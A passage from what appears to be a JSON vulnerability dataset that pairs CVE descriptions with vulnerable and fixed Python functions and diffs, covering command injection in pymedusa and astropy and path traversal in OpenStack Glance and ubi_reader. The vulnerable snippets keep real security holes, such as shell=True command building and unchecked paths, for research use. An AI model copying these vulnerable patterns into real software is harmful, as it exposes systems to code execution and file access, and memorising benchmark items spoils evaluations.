        "snippet": "    @security.private\n    def enumerateRoles(self, id=None, exact_match=False, sort_by=None,\n                       max_results=None, **kw):\n        \"\"\" See IRoleEnumerationPlugin.\n        \"\"\"\n        role_info = []\n        role_ids = []\n        plugin_id = self.getId()\n\n        if isinstance(id, str):\n            id = [id]\n\n        if exact_match and (id):\n            role_ids.extend(id)\n\n        if role_ids:\n            role_filter = None\n\n        else:   # Searching\n            role_ids = self.listRoleIds()\n            role_filter = _ZODBRoleFilter(id, **kw)\n\n        for role_id in role_ids:\n\n            if self._roles.get(role_id):\n                e_url = '%s/manage_roles' % self.getId()\n                p_qs = 'role_id=%s' % role_id\n                m_qs = 'role_id=%s&assign=1' % role_id\n\n                info = {}\n                info.update(self._roles[role_id])\n\n                info['pluginid'] = plugin_id\n                info['properties_url'] = '%s?%s' % (e_url, p_qs)\n                info['members_url'] = '%s?%s' % (e_url, m_qs)\n\n                if not role_filter or role_filter(info):\n                    role_info.append(info)\n\n        return tuple(role_info)"
      }
    ],
    "vul_patch": "--- a/src/Products/PluggableAuthService/plugins/ZODBRoleManager.py\n+++ b/src/Products/PluggableAuthService/plugins/ZODBRoleManager.py\n@@ -1,3 +1,4 @@\n+    @security.private\n     def enumerateRoles(self, id=None, exact_match=False, sort_by=None,\n                        max_results=None, **kw):\n         \"\"\" See IRoleEnumerationPlugin.\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-28627",
    "cve_description": "pymedusa is an automatic video library manager for TV Shows. In versions prior 1.0.12 an attacker with access to the web interface can update the git executable path in /config/general/ > advanced settings with arbitrary OS commands. An attacker may exploit this vulnerability to take execute arbitrary OS commands as the user running the pymedusa program. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/pymedusa/Medusa",
    "patch_url": [
      "https://github.com/pymedusa/Medusa/commit/66d4be8f0872bd5ddcdc5c5a58cb014d22834a45"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_241_1",
        "commit": "d44ae91",
        "file_path": "medusa/updater/github_updater.py",
        "start_line": 73,
        "end_line": 112,
        "snippet": "    def _find_working_git(self):\n        test_cmd = 'version'\n\n        if app.GIT_PATH:\n            main_git = '\"' + app.GIT_PATH + '\"'\n        else:\n            main_git = 'git'\n\n        log.debug(u'Checking if we can use git commands: {0} {1}', main_git, test_cmd)\n        _, _, exit_status = self._run_git(main_git, test_cmd)\n\n        if exit_status == 0:\n            log.debug(u'Using: {0}', main_git)\n            return main_git\n        else:\n            log.debug(u'Not using: {0}', main_git)\n\n        # trying alternatives\n        alternative_git = []\n\n        # osx people who start sr from launchd have a broken path, so try a hail-mary attempt for them\n        if platform.system().lower() == 'darwin':\n            alternative_git.append('/usr/local/git/bin/git')\n\n        if platform.system().lower() == 'windows':\n            if main_git != main_git.lower():\n                alternative_git.append(main_git.lower())\n\n        if alternative_git:\n            log.debug(u'Trying known alternative git locations')\n\n            for cur_git in alternative_git:\n                log.debug(u'Checking if we can use git commands: {0} {1}', cur_git, test_cmd)\n                _, _, exit_status = self._run_git(cur_git, test_cmd)\n\n                if exit_status == 0:\n                    log.debug(u'Using: {0}', cur_git)\n                    return cur_git\n                else:\n                    log.debug(u'Not using: {0}', cur_git)"
      },
      {
        "id": "vul_py_241_2",
        "commit": "d44ae91",
        "file_path": "medusa/updater/github_updater.py",
        "start_line": 114,
        "end_line": 180,
        "snippet": "    def _run_git(self, git_path, args):\n        output = err = exit_status = None\n\n        if not git_path:\n            git_path = self._find_working_git()\n            if git_path:\n                self._git_path = git_path\n            else:\n                # Warn user only if he has version check enabled\n                if app.VERSION_NOTIFY:\n                    log.warning(u\"No git specified, can't use git commands\")\n                    app.NEWEST_VERSION_STRING = ERROR_MESSAGE\n                exit_status = 1\n                return output, err, exit_status\n\n        # If we have a valid git remove the git warning\n        # String will be updated as soon we check github\n        app.NEWEST_VERSION_STRING = None\n        cmd = git_path + ' ' + args\n\n        try:\n            log.debug(u'Executing {cmd} with your shell in {dir}', {'cmd': cmd, 'dir': app.PROG_DIR})\n            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,\n                                 shell=True, cwd=app.PROG_DIR)\n            output, err = p.communicate()\n            exit_status = p.returncode\n\n            # Convert bytes to string in python3\n            if isinstance(output, (bytes, bytearray)):\n                output = output.decode('utf-8')\n\n            if output:\n                output = output.strip()\n\n        except OSError:\n            log.info(u\"Command {cmd} didn't work\", {'cmd': cmd})\n            exit_status = 1\n\n        if exit_status == 0:\n            log.debug(u'{cmd} : returned successful', {'cmd': cmd})\n\n        elif exit_status == 1:\n            if output:\n                if 'stash' in output:\n                    log.warning(u\"Enable 'git reset' in settings or stash your changes in local files\")\n                else:\n                    log.warning(u'{cmd} returned : {output}', {'cmd': cmd, 'output': output})\n            else:\n                log.warning(u'{cmd} returned no data', {'cmd': cmd})\n\n        elif exit_status == 128:\n            log.warning('{cmd} returned ({status}) : {output}',\n                        {'cmd': cmd, 'status': exit_status, 'output': output})\n\n        elif exit_status == 129:\n            if 'unknown option' in output and 'set-upstream-to' in output:\n                log.info(\"Can't set upstream to origin/{0} because you're running an old version of git.\"\n                         '\\nPlease upgrade your git installation to its latest version.', app.BRANCH)\n            else:\n                log.warning('{cmd} returned ({status}) : {output}',\n                            {'cmd': cmd, 'status': exit_status, 'output': output})\n\n        else:\n            log.warning(u'{cmd} returned : {output}. Treat as error for now', {'cmd': cmd, 'output': output})\n            exit_status = 1\n\n        return output, err, exit_status"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_241_1",
        "commit": "66d4be8",
        "file_path": "medusa/updater/github_updater.py",
        "start_line": 74,
        "end_line": 109,
        "snippet": "    def _find_working_git(self):\n        test_cmd = 'version'\n        main_git = app.GIT_PATH or 'git'\n\n        log.debug(u'Checking if we can use git commands: {0} {1}', main_git, test_cmd)\n        _, _, exit_status = self._run_git(main_git, test_cmd)\n\n        if exit_status == 0:\n            log.debug(u'Using: {0}', main_git)\n            return main_git\n        else:\n            log.debug(u'Not using: {0}', main_git)\n\n        # trying alternatives\n        alternative_git = []\n\n        # osx people who start sr from launchd have a broken path, so try a hail-mary attempt for them\n        if platform.system().lower() == 'darwin':\n            alternative_git.append('/usr/local/git/bin/git')\n\n        if platform.system().lower() == 'windows':\n            if main_git != main_git.lower():\n                alternative_git.append(main_git.lower())\n\n        if alternative_git:\n            log.debug(u'Trying known alternative git locations')\n\n            for cur_git in alternative_git:\n                log.debug(u'Checking if we can use git commands: {0} {1}', cur_git, test_cmd)\n                _, _, exit_status = self._run_git(cur_git, test_cmd)\n\n                if exit_status == 0:\n                    log.debug(u'Using: {0}', cur_git)\n                    return cur_git\n                else:\n                    log.debug(u'Not using: {0}', cur_git)"
      },
      {
        "id": "fix_py_241_2",
        "commit": "66d4be8",
        "file_path": "medusa/updater/github_updater.py",
        "start_line": 111,
        "end_line": 182,
        "snippet": "    def _run_git(self, git_path, args):\n        output = err = exit_status = None\n\n        if not git_path:\n            git_path = self._find_working_git()\n            if git_path:\n                self._git_path = git_path\n            else:\n                # Warn user only if he has version check enabled\n                if app.VERSION_NOTIFY:\n                    log.warning(u\"No git specified, can't use git commands\")\n                    app.NEWEST_VERSION_STRING = ERROR_MESSAGE\n                exit_status = 1\n                return output, err, exit_status\n\n        if git_path != 'git' and not os.path.isfile(git_path):\n            log.warning(u\"Invalid git specified, can't use git commands\")\n            exit_status = 1\n            return output, err, exit_status\n\n        # If we have a valid git remove the git warning\n        # String will be updated as soon we check github\n        app.NEWEST_VERSION_STRING = None\n        cmd = git_path + ' ' + args\n\n        try:\n            log.debug(u'Executing {cmd} with your shell in {dir}', {'cmd': cmd, 'dir': app.PROG_DIR})\n            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,\n                                 shell=True, cwd=app.PROG_DIR)\n            output, err = p.communicate()\n            exit_status = p.returncode\n\n            # Convert bytes to string in python3\n            if isinstance(output, (bytes, bytearray)):\n                output = output.decode('utf-8')\n\n            if output:\n                output = output.strip()\n\n        except OSError:\n            log.info(u\"Command {cmd} didn't work\", {'cmd': cmd})\n            exit_status = 1\n\n        if exit_status == 0:\n            log.debug(u'{cmd} : returned successful', {'cmd': cmd})\n\n        elif exit_status == 1:\n            if output:\n                if 'stash' in output:\n                    log.warning(u\"Enable 'git reset' in settings or stash your changes in local files\")\n                else:\n                    log.warning(u'{cmd} returned : {output}', {'cmd': cmd, 'output': output})\n            else:\n                log.warning(u'{cmd} returned no data', {'cmd': cmd})\n\n        elif exit_status == 128:\n            log.warning('{cmd} returned ({status}) : {output}',\n                        {'cmd': cmd, 'status': exit_status, 'output': output})\n\n        elif exit_status == 129:\n            if 'unknown option' in output and 'set-upstream-to' in output:\n                log.info(\"Can't set upstream to origin/{0} because you're running an old version of git.\"\n                         '\\nPlease upgrade your git installation to its latest version.', app.BRANCH)\n            else:\n                log.warning('{cmd} returned ({status}) : {output}',\n                            {'cmd': cmd, 'status': exit_status, 'output': output})\n\n        else:\n            log.warning(u'{cmd} returned : {output}. Treat as error for now', {'cmd': cmd, 'output': output})\n            exit_status = 1\n\n        return output, err, exit_status"
      }
    ],
    "vul_patch": "--- a/medusa/updater/github_updater.py\n+++ b/medusa/updater/github_updater.py\n@@ -1,10 +1,6 @@\n     def _find_working_git(self):\n         test_cmd = 'version'\n-\n-        if app.GIT_PATH:\n-            main_git = '\"' + app.GIT_PATH + '\"'\n-        else:\n-            main_git = 'git'\n+        main_git = app.GIT_PATH or 'git'\n \n         log.debug(u'Checking if we can use git commands: {0} {1}', main_git, test_cmd)\n         _, _, exit_status = self._run_git(main_git, test_cmd)\n\n--- a/medusa/updater/github_updater.py\n+++ b/medusa/updater/github_updater.py\n@@ -12,6 +12,11 @@\n                     app.NEWEST_VERSION_STRING = ERROR_MESSAGE\n                 exit_status = 1\n                 return output, err, exit_status\n+\n+        if git_path != 'git' and not os.path.isfile(git_path):\n+            log.warning(u\"Invalid git specified, can't use git commands\")\n+            exit_status = 1\n+            return output, err, exit_status\n \n         # If we have a valid git remove the git warning\n         # String will be updated as soon we check github\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-41334",
    "cve_description": "Astropy is a project for astronomy in Python that fosters interoperability between Python astronomy packages. Version 5.3.2 of the Astropy core package is vulnerable to remote code execution due to improper input validation in the `TranformGraph().to_dot_graph` function. A malicious user can provide a command or a script file as a value to the `savelayout` argument, which will be placed as the first value in a list of arguments passed to `subprocess.Popen`.  Although an error will be raised, the command or script will be executed successfully. Version 5.3.3 fixes this issue.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/astropy/astropy",
    "patch_url": [
      "https://github.com/astropy/astropy/commit/22057d37b1313f5f5a9b5783df0a091d978dccb5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_367_1",
        "commit": "026a140cec08a9e5b7c80726956969290f50e2d4",
        "file_path": "astropy/coordinates/transformations.py",
        "start_line": 468,
        "end_line": 591,
        "snippet": "    def to_dot_graph(\n        self,\n        priorities=True,\n        addnodes=[],\n        savefn=None,\n        savelayout=\"plain\",\n        saveformat=None,\n        color_edges=True,\n    ):\n        \"\"\"\n        Converts this transform graph to the graphviz_ DOT format.\n\n        Optionally saves it (requires `graphviz`_ be installed and on your path).\n\n        .. _graphviz: http://www.graphviz.org/\n\n        Parameters\n        ----------\n        priorities : bool\n            If `True`, show the priority values for each transform.  Otherwise,\n            the will not be included in the graph.\n        addnodes : sequence of str\n            Additional coordinate systems to add (this can include systems\n            already in the transform graph, but they will only appear once).\n        savefn : None or str\n            The file name to save this graph to or `None` to not save\n            to a file.\n        savelayout : str\n            The graphviz program to use to layout the graph (see\n            graphviz_ for details) or 'plain' to just save the DOT graph\n            content. Ignored if ``savefn`` is `None`.\n        saveformat : str\n            The graphviz output format. (e.g. the ``-Txxx`` option for\n            the command line program - see graphviz docs for details).\n            Ignored if ``savefn`` is `None`.\n        color_edges : bool\n            Color the edges between two nodes (frames) based on the type of\n            transform. ``FunctionTransform``: red, ``StaticMatrixTransform``:\n            blue, ``DynamicMatrixTransform``: green.\n\n        Returns\n        -------\n        dotgraph : str\n            A string with the DOT format graph.\n        \"\"\"\n        nodes = []\n        # find the node names\n        for a in self._graph:\n            if a not in nodes:\n                nodes.append(a)\n            for b in self._graph[a]:\n                if b not in nodes:\n                    nodes.append(b)\n        for node in addnodes:\n            if node not in nodes:\n                nodes.append(node)\n        nodenames = []\n        invclsaliases = {\n            f: [k for k, v in self._cached_names.items() if v == f]\n            for f in self.frame_set\n        }\n        for n in nodes:\n            if n in invclsaliases:\n                aliases = \"`\\\\n`\".join(invclsaliases[n])\n                nodenames.append(\n                    '{0} [shape=oval label=\"{0}\\\\n`{1}`\"]'.format(n.__name__, aliases)\n                )\n            else:\n                nodenames.append(n.__name__ + \"[ shape=oval ]\")\n\n        edgenames = []\n        # Now the edges\n        for a in self._graph:\n            agraph = self._graph[a]\n            for b in agraph:\n                transform = agraph[b]\n                pri = transform.priority if hasattr(transform, \"priority\") else 1\n                color = trans_to_color[transform.__class__] if color_edges else \"black\"\n                edgenames.append((a.__name__, b.__name__, pri, color))\n\n        # generate simple dot format graph\n        lines = [\"digraph AstropyCoordinateTransformGraph {\"]\n        lines.append(\"graph [rankdir=LR]\")\n        lines.append(\"; \".join(nodenames) + \";\")\n        for enm1, enm2, weights, color in edgenames:\n            labelstr_fmt = \"[ {0} {1} ]\"\n\n            if priorities:\n                priority_part = f'label = \"{weights}\"'\n            else:\n                priority_part = \"\"\n\n            color_part = f'color = \"{color}\"'\n\n            labelstr = labelstr_fmt.format(priority_part, color_part)\n            lines.append(f\"{enm1} -> {enm2}{labelstr};\")\n\n        lines.append(\"\")\n        lines.append(\"overlap=false\")\n        lines.append(\"}\")\n        dotgraph = \"\\n\".join(lines)\n\n        if savefn is not None:\n            if savelayout == \"plain\":\n                with open(savefn, \"w\") as f:\n                    f.write(dotgraph)\n            else:\n                args = [savelayout]\n                if saveformat is not None:\n                    args.append(\"-T\" + saveformat)\n                proc = subprocess.Popen(\n                    args,\n                    stdin=subprocess.PIPE,\n                    stdout=subprocess.PIPE,\n                    stderr=subprocess.PIPE,\n                )\n                stdout, stderr = proc.communicate(dotgraph)\n                if proc.returncode != 0:\n                    raise OSError(\"problem running graphviz: \\n\" + stderr)\n\n                with open(savefn, \"w\") as f:\n                    f.write(stdout)\n\n        return dotgraph"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_367_1",
        "commit": "22057d37b1313f5f5a9b5783df0a091d978dccb5",
        "file_path": "astropy/coordinates/transformations.py",
        "start_line": 468,
        "end_line": 605,
        "snippet": "    def to_dot_graph(\n        self,\n        priorities=True,\n        addnodes=[],\n        savefn=None,\n        savelayout=\"plain\",\n        saveformat=None,\n        color_edges=True,\n    ):\n        \"\"\"\n        Converts this transform graph to the graphviz_ DOT format.\n\n        Optionally saves it (requires `graphviz`_ be installed and on your path).\n\n        .. _graphviz: http://www.graphviz.org/\n\n        Parameters\n        ----------\n        priorities : bool\n            If `True`, show the priority values for each transform.  Otherwise,\n            the will not be included in the graph.\n        addnodes : sequence of str\n            Additional coordinate systems to add (this can include systems\n            already in the transform graph, but they will only appear once).\n        savefn : None or str\n            The file name to save this graph to or `None` to not save\n            to a file.\n        savelayout : {\"plain\", \"dot\", \"neato\", \"fdp\", \"sfdp\", \"circo\", \"twopi\", \"nop\", \"nop2\", \"osage\", \"patchwork\"}\n            The graphviz program to use to layout the graph (see\n            graphviz_ for details) or 'plain' to just save the DOT graph\n            content. Ignored if ``savefn`` is `None`.\n        saveformat : str\n            The graphviz output format. (e.g. the ``-Txxx`` option for\n            the command line program - see graphviz docs for details).\n            Ignored if ``savefn`` is `None`.\n        color_edges : bool\n            Color the edges between two nodes (frames) based on the type of\n            transform. ``FunctionTransform``: red, ``StaticMatrixTransform``:\n            blue, ``DynamicMatrixTransform``: green.\n\n        Returns\n        -------\n        dotgraph : str\n            A string with the DOT format graph.\n        \"\"\"\n        nodes = []\n        # find the node names\n        for a in self._graph:\n            if a not in nodes:\n                nodes.append(a)\n            for b in self._graph[a]:\n                if b not in nodes:\n                    nodes.append(b)\n        for node in addnodes:\n            if node not in nodes:\n                nodes.append(node)\n        nodenames = []\n        invclsaliases = {\n            f: [k for k, v in self._cached_names.items() if v == f]\n            for f in self.frame_set\n        }\n        for n in nodes:\n            if n in invclsaliases:\n                aliases = \"`\\\\n`\".join(invclsaliases[n])\n                nodenames.append(\n                    '{0} [shape=oval label=\"{0}\\\\n`{1}`\"]'.format(n.__name__, aliases)\n                )\n            else:\n                nodenames.append(n.__name__ + \"[ shape=oval ]\")\n\n        edgenames = []\n        # Now the edges\n        for a in self._graph:\n            agraph = self._graph[a]\n            for b in agraph:\n                transform = agraph[b]\n                pri = transform.priority if hasattr(transform, \"priority\") else 1\n                color = trans_to_color[transform.__class__] if color_edges else \"black\"\n                edgenames.append((a.__name__, b.__name__, pri, color))\n\n        # generate simple dot format graph\n        lines = [\"digraph AstropyCoordinateTransformGraph {\"]\n        lines.append(\"graph [rankdir=LR]\")\n        lines.append(\"; \".join(nodenames) + \";\")\n        for enm1, enm2, weights, color in edgenames:\n            labelstr_fmt = \"[ {0} {1} ]\"\n\n            if priorities:\n                priority_part = f'label = \"{weights}\"'\n            else:\n                priority_part = \"\"\n\n            color_part = f'color = \"{color}\"'\n\n            labelstr = labelstr_fmt.format(priority_part, color_part)\n            lines.append(f\"{enm1} -> {enm2}{labelstr};\")\n\n        lines.append(\"\")\n        lines.append(\"overlap=false\")\n        lines.append(\"}\")\n        dotgraph = \"\\n\".join(lines)\n\n        if savefn is not None:\n            if savelayout == \"plain\":\n                with open(savefn, \"w\") as f:\n                    f.write(dotgraph)\n            # Options from https://graphviz.org/docs/layouts/\n            elif savelayout in (\n                \"dot\",\n                \"neato\",\n                \"fdp\",\n                \"sfdp\",\n                \"circo\",\n                \"twopi\",\n                \"nop\",\n                \"nop2\",\n                \"osage\",\n                \"patchwork\",\n            ):\n                args = [savelayout]\n                if saveformat is not None:\n                    args.append(\"-T\" + saveformat)\n                proc = subprocess.Popen(\n                    args,\n                    stdin=subprocess.PIPE,\n                    stdout=subprocess.PIPE,\n                    stderr=subprocess.PIPE,\n                )\n                stdout, stderr = proc.communicate(dotgraph)\n                if proc.returncode != 0:\n                    raise OSError(\"problem running graphviz: \\n\" + stderr)\n\n                with open(savefn, \"w\") as f:\n                    f.write(stdout)\n            else:\n                raise NotImplementedError(f'savelayout=\"{savelayout}\" is not supported')\n\n        return dotgraph"
      }
    ],
    "vul_patch": "--- a/astropy/coordinates/transformations.py\n+++ b/astropy/coordinates/transformations.py\n@@ -25,7 +25,7 @@\n         savefn : None or str\n             The file name to save this graph to or `None` to not save\n             to a file.\n-        savelayout : str\n+        savelayout : {\"plain\", \"dot\", \"neato\", \"fdp\", \"sfdp\", \"circo\", \"twopi\", \"nop\", \"nop2\", \"osage\", \"patchwork\"}\n             The graphviz program to use to layout the graph (see\n             graphviz_ for details) or 'plain' to just save the DOT graph\n             content. Ignored if ``savefn`` is `None`.\n@@ -104,7 +104,19 @@\n             if savelayout == \"plain\":\n                 with open(savefn, \"w\") as f:\n                     f.write(dotgraph)\n-            else:\n+            # Options from https://graphviz.org/docs/layouts/\n+            elif savelayout in (\n+                \"dot\",\n+                \"neato\",\n+                \"fdp\",\n+                \"sfdp\",\n+                \"circo\",\n+                \"twopi\",\n+                \"nop\",\n+                \"nop2\",\n+                \"osage\",\n+                \"patchwork\",\n+            ):\n                 args = [savelayout]\n                 if saveformat is not None:\n                     args.append(\"-T\" + saveformat)\n@@ -120,5 +132,7 @@\n \n                 with open(savefn, \"w\") as f:\n                     f.write(stdout)\n+            else:\n+                raise NotImplementedError(f'savelayout=\"{savelayout}\" is not supported')\n \n         return dotgraph\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-1195",
    "cve_description": "The V2 API in OpenStack Image Registry and Delivery Service (Glance) before 2014.1.4 and 2014.2.x before 2014.2.2 allows remote authenticated users to read or delete arbitrary files via a full pathname in a filesystem: URL in the image location property.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-9493.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/openstack/glance",
    "patch_url": [
      "https://github.com/openstack/glance/commit/5191ed1879c5fd5b2694f922bcedec232f461088",
      "https://github.com/openstack/glance/commit/a2d986b976e9325a272e2d422465165315d19fe6",
      "https://github.com/openstack/glance/commit/7d3a1db33ccbd25b9fc7326ce3468eabd2a41a99"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_407_1",
        "commit": "42564be7ea133313a52639c27172d035390da1f2",
        "file_path": "glance/common/store_utils.py",
        "start_line": 125,
        "end_line": 143,
        "snippet": "def validate_external_location(uri):\n    \"\"\"\n    Validate if URI of external location are supported.\n\n    Only over non-local store types are OK, i.e. S3, Swift,\n    HTTP. Note the absence of 'file://' for security reasons,\n    see LP bug #942118, 1400966, 'swift+config://' is also\n    absent for security reasons, see LP bug #1334196.\n\n    :param uri: The URI of external image location.\n    :return: Whether given URI of external image location are OK.\n    \"\"\"\n\n    # TODO(zhiyan): This function could be moved to glance_store.\n\n    pieces = urlparse.urlparse(uri)\n    valid_schemes = [scheme for scheme in store_api.get_known_schemes()\n                     if scheme != 'file' and scheme != 'swift+config']\n    return pieces.scheme in valid_schemes"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_407_1",
        "commit": "5191ed1879c5fd5b2694f922bcedec232f461088",
        "file_path": "glance/common/store_utils.py",
        "start_line": 127,
        "end_line": 144,
        "snippet": "def validate_external_location(uri):\n    \"\"\"\n    Validate if URI of external location are supported.\n\n    Only over non-local store types are OK, i.e. S3, Swift,\n    HTTP. Note the absence of 'file://' for security reasons,\n    see LP bug #942118, 1400966, 'swift+config://' is also\n    absent for security reasons, see LP bug #1334196.\n\n    :param uri: The URI of external image location.\n    :return: Whether given URI of external image location are OK.\n    \"\"\"\n\n    # TODO(zhiyan): This function could be moved to glance_store.\n    # TODO(gm): Use a whitelist of allowed schemes\n    scheme = urlparse.urlparse(uri).scheme\n    return (scheme in store_api.get_known_schemes() and\n            scheme not in RESTRICTED_URI_SCHEMAS)"
      }
    ],
    "vul_patch": "--- a/glance/common/store_utils.py\n+++ b/glance/common/store_utils.py\n@@ -12,8 +12,7 @@\n     \"\"\"\n \n     # TODO(zhiyan): This function could be moved to glance_store.\n-\n-    pieces = urlparse.urlparse(uri)\n-    valid_schemes = [scheme for scheme in store_api.get_known_schemes()\n-                     if scheme != 'file' and scheme != 'swift+config']\n-    return pieces.scheme in valid_schemes\n+    # TODO(gm): Use a whitelist of allowed schemes\n+    scheme = urlparse.urlparse(uri).scheme\n+    return (scheme in store_api.get_known_schemes() and\n+            scheme not in RESTRICTED_URI_SCHEMAS)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-4572",
    "cve_description": "A vulnerability, which was classified as problematic, has been found in UBI Reader up to 0.8.0. Affected by this issue is the function ubireader_extract_files of the file ubireader/ubifs/output.py of the component UBIFS File Handler. The manipulation leads to path traversal. The attack may be launched remotely. Upgrading to version 0.8.5 is able to address this issue. The name of the patch is d5d68e6b1b9f7070c29df5f67fc060f579ae9139. It is recommended to upgrade the affected component. VDB-216146 is the identifier assigned to this vulnerability.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/jrspruitt/ubi_reader",
    "patch_url": [
      "https://github.com/jrspruitt/ubi_reader/commit/d5d68e6b1b9f7070c29df5f67fc060f579ae9139"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_229_1",
        "commit": "b04b1bd",
        "file_path": "ubireader/ubifs/output.py",
        "start_line": 56,
        "end_line": 148,
        "snippet": "def extract_dents(ubifs, inodes, dent_node, path='', perms=False):\n    if dent_node.inum not in inodes:\n        error(extract_dents, 'Error', 'inum: %s not found in inodes' % (dent_node.inum))\n        return\n\n    inode = inodes[dent_node.inum]\n    dent_path = os.path.join(path, dent_node.name)\n        \n    if dent_node.type == UBIFS_ITYPE_DIR:\n        try:\n            if not os.path.exists(dent_path):\n                os.mkdir(dent_path)\n                log(extract_dents, 'Make Dir: %s' % (dent_path))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'DIR Fail: %s' % e)\n\n        if 'dent' in inode:\n            for dnode in inode['dent']:\n                extract_dents(ubifs, inodes, dnode, dent_path, perms)\n\n        _set_file_timestamps(dent_path, inode)\n\n    elif dent_node.type == UBIFS_ITYPE_REG:\n        try:\n            if inode['ino'].nlink > 1:\n                if 'hlink' not in inode:\n                    inode['hlink'] = dent_path\n                    buf = _process_reg_file(ubifs, inode, dent_path)\n                    _write_reg_file(dent_path, buf)\n                else:\n                    os.link(inode['hlink'], dent_path)\n                    log(extract_dents, 'Make Link: %s > %s' % (dent_path, inode['hlink']))\n            else:\n                buf = _process_reg_file(ubifs, inode, dent_path)\n                _write_reg_file(dent_path, buf)\n\n            _set_file_timestamps(dent_path, inode)\n\n            if perms:\n                _set_file_perms(dent_path, inode)\n\n        except Exception as e:\n            error(extract_dents, 'Warn', 'FILE Fail: %s' % e)\n\n    elif dent_node.type == UBIFS_ITYPE_LNK:\n        try:\n            # probably will need to decompress ino data if > UBIFS_MIN_COMPR_LEN\n            os.symlink('%s' % inode['ino'].data.decode('utf-8'), dent_path)\n            log(extract_dents, 'Make Symlink: %s > %s' % (dent_path, inode['ino'].data))\n\n        except Exception as e:\n            error(extract_dents, 'Warn', 'SYMLINK Fail: %s' % e) \n\n    elif dent_node.type in [UBIFS_ITYPE_BLK, UBIFS_ITYPE_CHR]:\n        try:\n            dev = struct.unpack('<II', inode['ino'].data)[0]\n            if not settings.use_dummy_devices:\n                os.mknod(dent_path, inode['ino'].mode, dev)\n                log(extract_dents, 'Make Device Node: %s' % (dent_path))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n            else:\n                log(extract_dents, 'Create dummy device.')\n                _write_reg_file(dent_path, str(dev))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n                \n        except Exception as e:\n            error(extract_dents, 'Warn', 'DEV Fail: %s' % e)\n\n    elif dent_node.type == UBIFS_ITYPE_FIFO:\n        try:\n            os.mkfifo(dent_path, inode['ino'].mode)\n            log(extract_dents, 'Make FIFO: %s' % (path))\n\n            if perms:\n                _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'FIFO Fail: %s : %s' % (dent_path, e))\n\n    elif dent_node.type == UBIFS_ITYPE_SOCK:\n        try:\n            if settings.use_dummy_socket_file:\n                _write_reg_file(dent_path, '')\n                if perms:\n                    _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'SOCK Fail: %s : %s' % (dent_path, e))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_229_1",
        "commit": "d5d68e6",
        "file_path": "ubireader/ubifs/output.py",
        "start_line": 60,
        "end_line": 156,
